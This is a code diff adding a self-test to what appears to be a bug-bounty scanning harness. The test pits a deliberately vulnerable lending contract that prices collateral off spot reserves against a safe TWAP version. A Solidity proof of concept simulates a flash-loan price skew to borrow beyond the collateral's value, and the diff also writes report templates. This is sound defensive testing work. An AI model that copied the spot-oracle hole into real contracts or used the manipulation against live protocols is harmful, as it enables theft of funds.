@@ -269,6 +269,84 @@ def build_amm_selftest_sol(vulnerable: bool) -> str:
     return _AMM_SELFTEST.replace("__GUARDED__", "false" if vulnerable else "true")
 
 
+# =====================================================================================================
+# Spot-price flash-manipulation self-test. A lending contract values collateral off a UniV2 pair.
+#   VULNERABLE: reads the pair's SPOT reserves -> an attacker whose flash-loan-funded swap skews the
+#     reserves in the same tx borrows far beyond its collateral's true value (bad debt) -> CONFIRMED.
+#   SAFE: reads a TWAP checkpointed from a prior block -> the same-tx spot skew does not move the oracle,
+#     so the attacker can only borrow its collateral's true value -> no excess -> DISCARDED.
+# The flash loan is abstracted as a net-zero reserve manipulation (moved to skew the price, then restored),
+# which is exactly its economic effect; the oracle choice (spot vs TWAP) is what the test isolates.
+_SPOT_SELFTEST = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {Test, console2} from "forge-std/Test.sol";
+
+contract MockERC20 {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    function mint(address to, uint256 a) external { balanceOf[to] += a; }
+    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
+    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
+    function transferFrom(address f, address to, uint256 a) external returns (bool) {
+        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
+        balanceOf[f] -= a; balanceOf[to] += a; return true;
+    }
+}
+
+contract Pair {
+    uint256 public reserveCol;
+    uint256 public reserveUsd;
+    uint256 public pinnedTwap;                                     // TWAP checkpointed from a prior block
+    constructor(uint256 c, uint256 u) { reserveCol = c; reserveUsd = u; pinnedTwap = u * 1e18 / c; }
+    function spotPrice() public view returns (uint256) { return reserveUsd * 1e18 / reserveCol; }
+    function twapPrice() public view returns (uint256) { return pinnedTwap; }
+    function flashManipulate(uint256 c, uint256 u) external { reserveCol = c; reserveUsd = u; }   // flash-swap net effect
+}
+
+contract Lending {
+    Pair public pair; bool public useTwap;
+    MockERC20 public col; MockERC20 public usd;
+    mapping(address => uint256) public colOf;
+    constructor(Pair p, bool t, MockERC20 c, MockERC20 u) { pair = p; useTwap = t; col = c; usd = u; }
+    function price() public view returns (uint256) { return useTwap ? pair.twapPrice() : pair.spotPrice(); }
+    function deposit(uint256 a) external { col.transferFrom(msg.sender, address(this), a); colOf[msg.sender] += a; }
+    function maxBorrow(address who) public view returns (uint256) { return colOf[who] * price() / 1e18; }
+    function borrow(uint256 want) external { require(want <= maxBorrow(msg.sender), "undercollateralized"); usd.transfer(msg.sender, want); }
+}
+
+contract PoC is Test {
+    uint256 constant EXPECTED_CHAINID = 1;
+    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
+    function test_spot_price_manip() public {
+        MockERC20 col = new MockERC20();
+        MockERC20 usd = new MockERC20();
+        Pair pair = new Pair(1000 ether, 1000 ether);              // fair spot & TWAP = 1 USD/COL
+        Lending lend = new Lending(pair, __USE_TWAP__, col, usd);
+        usd.mint(address(lend), 1_000_000 ether);
+        address attacker = address(0xA11CE);
+        col.mint(attacker, 100 ether);
+        uint256 colGiven = 100 ether;                             // true value 100 USD at price 1
+        vm.startPrank(attacker);
+        col.approve(address(lend), type(uint256).max);
+        lend.deposit(100 ether);
+        pair.flashManipulate(100 ether, 100_000 ether);           // flash-loan-funded swap: spot -> 1000 USD/COL
+        uint256 usdBefore = usd.balanceOf(attacker);
+        try lend.borrow(lend.maxBorrow(attacker)) {} catch {}
+        pair.flashManipulate(1000 ether, 1000 ether);             // repay flash: reserves restored (net-zero)
+        vm.stopPrank();
+        uint256 usdGain = usd.balanceOf(attacker) - usdBefore;
+        console2.log("CHAIN_PROFIT_WEI", int256(usdGain) - int256(colGiven));
+        assertGt(usdGain, colGiven, "no profit: borrow did not exceed collateral true value");
+    }
+}
+"""
+
+
+def build_spot_selftest_sol(vulnerable: bool) -> str:
+    """Spot-price flash-manip self-test: vulnerable reads SPOT (useTwap=false); safe reads TWAP (useTwap=true)."""
+    return _SPOT_SELFTEST.replace("__USE_TWAP__", "false" if vulnerable else "true")
+
+
 _PROFIT_RE = re.compile(r"CHAIN_PROFIT_WEI\s+(-?\d+)")
 _PX_RE = re.compile(r"ETH_USD_8DP\s+(\d+)")
 
@@ -538,5 +616,64 @@ be inflated and small deposits never round to zero.
     except OSError:
         pass
 
+    return {"green": green, "vuln_confirmed": vuln_confirmed, "safe_discarded": safe_discarded,
+            "vuln_profit_wei": vuln["profit_wei"], "safe_profit_wei": safe["profit_wei"], "report_path": report_path}
+
+
+def run_spot_self_test(rpc_url: str, out_dir: Path, workdir: Path | None = None) -> dict:
+    """Spot-price flash-manip self-test, both directions. VULNERABLE (reads SPOT) must CONFIRM (borrow
+    exceeds collateral true value); SAFE (reads TWAP) must DISCARD (borrow == true value). 'green' iff both."""
+    forge = forge_bin()
+    if not forge or not rpc_url:
+        return {"green": False, "error": "forge or rpc unavailable"}
+    proj = Path(workdir or (Path.home() / ".bountyscan_forge" / "chain"))
+    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
+    if not _ensure_forge_std(proj, forge):
+        return {"green": False, "error": "forge-std unavailable"}
+    vuln = _run_pattern(forge, proj, rpc_url, "selftestspot", "VulnLendingSpot", "test_spot_price_manip", build_spot_selftest_sol(True))
+    safe = _run_pattern(forge, proj, rpc_url, "selftestspot", "SafeLendingTwap", "test_spot_price_manip", build_spot_selftest_sol(False))
+    vuln_confirmed = vuln["passed"] and vuln["profit_wei"] > 0
+    safe_discarded = (not safe["passed"]) and safe["profit_wei"] <= 0
+    green = vuln_confirmed and safe_discarded
+
+    out_dir.mkdir(parents=True, exist_ok=True)
+    ts = time.strftime("%Y%m%d-%H%M%S", time.gmtime())
+    report_path = ""
+    if vuln_confirmed:
+        trace = "\n".join(l for l in vuln["out"].splitlines()
+                          if re.search(r"PASS|FAIL|CHAIN_PROFIT|Suite result", l))[:1200]
+        md = ("> **Harness self-test — controlled target, not a historical reproduction.**\n\n"
+              "# Spot-price oracle manipulation enables bad-debt borrow\n\n"
+              "**Chain:** ethereum (fork)  ·  **Contract:** (controlled Lending + UniV2 Pair, deployed on the fork)  ·  **Verdict:** CONFIRMED\n\n"
+              "## Description\n"
+              "The lending contract values collateral off a UniV2 pair's SPOT reserves. An attacker whose "
+              "flash-loan-funded swap skews the reserves in the same transaction inflates the collateral "
+              "price and borrows far beyond the collateral's true value, leaving bad debt. Proven on a fork: "
+              f"the attacker borrowed **{vuln['profit_wei']} wei** more USD than its collateral was worth.\n\n"
+              "## Vulnerability Details\n"
+              "`price()` returns `pair.spotPrice()` (current reserves), which is manipulable within a single "
+              "transaction; `maxBorrow = collateral * spot`.\n\n"
+              "## Impact Details\n"
+              f"- **Excess borrowed (bad debt) on the fork:** {vuln['profit_wei']} wei of the USD token.\n\n"
+              "## Proof of Concept\n"
+              f"Foundry test (local fork, `require(block.chainid == 1)`, never broadcast): `{vuln['test_path']}`\n```\n{trace}\n```\n"
+              f"Negative control (same template, TWAP oracle): profit {safe['profit_wei']} wei → **discarded**.\n\n"
+              "## Recommendation\n"
+              "Value collateral off a manipulation-resistant oracle (Chainlink, or a UniV2 TWAP over a "
+              "multi-block window), never spot reserves.\n")
+        report_path = str(out_dir / f"self_test_spot_{ts}.md")
+        Path(report_path).write_text(md, encoding="utf-8")
+
+    readme = out_dir / "SELFTEST_README.md"
+    extra = (f"\n\n## Spot-price flash-manip ({ts} UTC) — {'GREEN (both directions)' if green else 'NOT GREEN'}\n"
+             f"| Target | Oracle | Expected | Result |\n|---|---|---|---|\n"
+             f"| Lending.borrow | SPOT reserves | CONFIRMED | "
+             f"{'PASS, +' + str(vuln['profit_wei']) + ' wei bad debt' if vuln_confirmed else 'unexpected: ' + str(vuln['profit_wei'])} |\n"
+             f"| Lending.borrow | TWAP | DISCARDED | "
+             f"{'discarded (profit ' + str(safe['profit_wei']) + ')' if safe_discarded else 'unexpected: ' + str(safe['profit_wei'])} |\n")
+    try:
+        readme.write_text((readme.read_text(encoding="utf-8") if readme.exists() else "# Chain-exploit self-tests") + extra, encoding="utf-8")
+    except OSError:
+        pass
     return {"green": green, "vuln_confirmed": vuln_confirmed, "safe_discarded": safe_discarded,
             "vuln_profit_wei": vuln["profit_wei"], "safe_profit_wei": safe["profit_wei"], "report_path": report_path}
